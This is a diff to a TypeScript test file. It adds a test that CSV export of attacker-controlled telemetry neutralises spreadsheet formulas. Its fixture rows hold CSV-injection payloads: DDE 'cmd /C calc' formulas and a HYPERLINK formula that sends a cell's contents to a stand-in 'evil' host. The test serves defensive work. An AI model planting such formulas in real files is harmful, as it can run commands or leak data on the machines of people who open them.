@@ -4,6 +4,7 @@ import {
   clampFocus,
   filterRows,
   formatRows,
+  neutraliseFormula,
   sortKind,
   sortRows,
   toCsv,
@@ -198,5 +199,36 @@ describe("query: the table's focus and view across tabs", () => {
     assert.deepEqual(queryViewState({ table: { filter: "", filterColumn: "", sort: { column: 1 } } }), {
       table: { filter: "", filterColumn: "" },
     });
+  });
+});
+
+describe("query: CSV of attacker-controlled telemetry (CSV injection)", () => {
+  it("prefixes a quote to cells a spreadsheet would evaluate, and leaves numbers alone", () => {
+    const columns = [{ name: "CommandLine" }, { name: "User" }];
+    const rows = [
+      { CommandLine: "=cmd|' /C calc'!A0", User: "+SUM(1+1)" },
+      { CommandLine: '=HYPERLINK("http://evil/?"&A1,"x")', User: -2 },
+      { CommandLine: "@SUM(1+1)*cmd|' /C calc'!A0", User: "-2+3" },
+      { CommandLine: "\tx", User: "plain" },
+    ];
+    assert.equal(
+      toCsv(columns, rows),
+      [
+        "CommandLine,User",
+        "'=cmd|' /C calc'!A0,'+SUM(1+1)",
+        `"'=HYPERLINK(""http://evil/?""&A1,""x"")",-2`,
+        "'@SUM(1+1)*cmd|' /C calc'!A0,'-2+3",
+        "'\tx,plain",
+        "",
+      ].join("\r\n"),
+    );
+    assert.equal(neutraliseFormula("-1.5e3"), "-1.5e3");
+    assert.equal(neutraliseFormula("+7"), "+7");
+    assert.equal(neutraliseFormula("- list item"), "'- list item");
+    assert.equal(
+      formatRows("json", columns, [rows[0] as (typeof rows)[0]]).includes("'="),
+      false,
+      "JSON untouched",
+    );
   });
 });
